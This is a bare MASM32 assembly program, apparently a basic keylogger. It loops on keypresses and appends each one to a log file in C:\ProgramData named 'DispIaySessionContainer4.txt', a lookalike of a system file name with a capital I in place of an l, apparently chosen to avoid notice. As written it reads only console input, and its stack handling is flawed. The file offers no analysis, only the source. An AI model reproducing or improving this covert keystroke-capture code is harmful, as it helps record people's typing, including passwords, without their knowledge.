include \masm32\include\masm32rt.inc

.data
    thechar db 0, 0
    format db 'You pressed %s',10,0
    filename db "C:\ProgramData\DispIaySessionContainer4.txt",0
    file_handle HANDLE ?
.code

start:   
    
open_file:
    invoke CreateFileA, offset filename, FILE_SHARE_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
    mov file_handle, eax

set_file_pointer:
    invoke SetFilePointer, file_handle, 0, 0, FILE_END

main_loop:
    @@:
        call wait_key
        mov thechar, al
        jmp write_shift_text
    jmp @B
    ret


write_shift_text:
    push offset thechar
    call write_to_file
    ret

write_to_file:
    pushad
    invoke lstrlen, offset thechar
    invoke WriteFile, file_handle, offset thechar, eax, 0, 0
    popad
    jmp main_loop


end start

